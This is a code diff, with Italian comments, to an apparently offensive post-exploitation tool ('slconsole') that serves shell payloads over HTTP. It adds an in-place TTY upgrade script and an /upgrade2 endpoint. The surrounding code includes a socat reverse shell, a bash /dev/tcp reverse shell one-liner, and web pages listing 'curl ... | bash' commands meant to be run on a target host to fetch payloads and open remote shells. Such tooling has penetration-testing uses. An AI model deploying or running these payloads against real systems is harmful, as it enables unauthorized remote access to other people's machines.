@@ -105,6 +105,53 @@ echo "[*] Lancio shell stabile verso {lhost}:{lport}..."
 /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport} &
 """
 
+UPGRADE2_TEMPLATE = r"""#!/bin/bash
+# === slconsole in-place shell upgrade ===
+# Upgrada la shell corrente a TTY interattiva senza aprire nuove connessioni.
+
+echo "[*] Upgrade in-place della shell corrente..."
+
+# Metodo 1: python3 pty.spawn
+if command -v python3 >/dev/null 2>&1; then
+    echo "[+] python3 trovato — spawning TTY..."
+    python3 -c 'import pty; pty.spawn("/bin/bash")'
+    exit 0
+fi
+
+# Metodo 2: python2 pty.spawn
+if command -v python >/dev/null 2>&1; then
+    echo "[+] python trovato — spawning TTY..."
+    python -c 'import pty; pty.spawn("/bin/bash")'
+    exit 0
+fi
+
+# Metodo 3: script
+if command -v script >/dev/null 2>&1; then
+    echo "[+] script trovato — spawning TTY..."
+    script -qc /bin/bash /dev/null
+    exit 0
+fi
+
+# Metodo 4: expect
+if command -v expect >/dev/null 2>&1; then
+    echo "[+] expect trovato — spawning TTY..."
+    expect -c 'spawn /bin/bash; interact'
+    exit 0
+fi
+
+# Metodo 5: perl pty
+if command -v perl >/dev/null 2>&1; then
+    echo "[+] perl trovato — spawning TTY..."
+    perl -e 'exec "/bin/bash";'
+    exit 0
+fi
+
+echo "[-] Nessun metodo disponibile per l'upgrade in-place."
+echo "    Metodi cercati: python3, python, script, expect, perl"
+echo "    Usa /upgrade per upgrade via nuova connessione socat."
+exit 1
+"""
+
 REVSHELL_BASH = "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\n"
 
 REVSHELL_PYTHON = (
@@ -121,6 +168,7 @@ INDEX_TEMPLATE = """<!DOCTYPE html>
 <h3>Endpoint dinamici</h3>
 <ul>
   <li><code>curl {base}/upgrade | bash</code> — Upgrade shell (socat/python pty)</li>
+  <li><code>curl {base}/upgrade2 | bash</code> — Upgrade in-place (no nuova connessione)</li>
   <li><code>curl {base}/rev</code> — Reverse shell Bash</li>
   <li><code>curl {base}/sh</code> — Reverse shell Python</li>
 </ul>
@@ -996,6 +1044,9 @@ def _page_delivery() -> str:
         ("upgrade", "Upgrade Shell", "Trasforma una shell instabile in una TTY interattiva (socat/python pty)",
          f"curl {base}/upgrade | bash",
          "Prerequisito: <code>socat file:$(tty),raw,echo=0 tcp-listen:4444</code>"),
+        ("upgrade2", "Upgrade In-Place", "Upgrada la shell corrente a TTY senza aprire nuove connessioni (python pty, script, expect, perl)",
+         f"curl {base}/upgrade2 | bash",
+         "Nessun prerequisito — eseguilo direttamente nella shell del target"),
         ("rev", "Reverse Shell Bash", "One-liner bash per reverse shell",
          f"curl {base}/rev | bash",
          "Prerequisito: <code>nc -lvnp 4444</code>"),
@@ -1056,6 +1107,9 @@ def _page_delivery() -> str:
 </div>
 </div>"""
     return _base_html("Delivery", body, active="delivery")
+
+
+def _page_logs() -> str:
     body = """\
 <div class="container">
 <div class="breadcrumb"><a href="/">Home</a> <span>/</span> Logs</div>
@@ -1212,6 +1266,8 @@ class SlRequestHandler(http.server.BaseHTTPRequestHandler):
                 self._send_html(_page_home())
         elif path in ("/upgrade", "/upgrade_revshell"):
             self._send_text(UPGRADE_TEMPLATE.format(**pv))
+        elif path == "/upgrade2":
+            self._send_text(UPGRADE2_TEMPLATE)
         elif path == "/rev":
             self._send_text(REVSHELL_BASH.format(**pv))
         elif path == "/sh":
@@ -1609,9 +1665,10 @@ def list_static() -> str:
         base = "http://<LHOST>:2727"
     lines = [
         "\n\033[1mEndpoint dinamici:\033[0m",
-        f"  curl {base}/upgrade | bash   \033[90m# Upgrade shell (socat/python pty)\033[0m",
-        f"  curl {base}/rev | bash       \033[90m# Reverse shell Bash\033[0m",
-        f"  curl {base}/sh | bash        \033[90m# Reverse shell Python\033[0m",
+        f"  curl {base}/upgrade | bash    \033[90m# Upgrade shell (socat/python pty)\033[0m",
+        f"  curl {base}/upgrade2 | bash   \033[90m# Upgrade in-place (no nuova connessione)\033[0m",
+        f"  curl {base}/rev | bash        \033[90m# Reverse shell Bash\033[0m",
+        f"  curl {base}/sh | bash         \033[90m# Reverse shell Python\033[0m",
     ]
     if not STATIC_ROOT.is_dir():
         lines.append("\n\033[1mFile statici:\033[0m\n  Cartella static/ non trovata.")
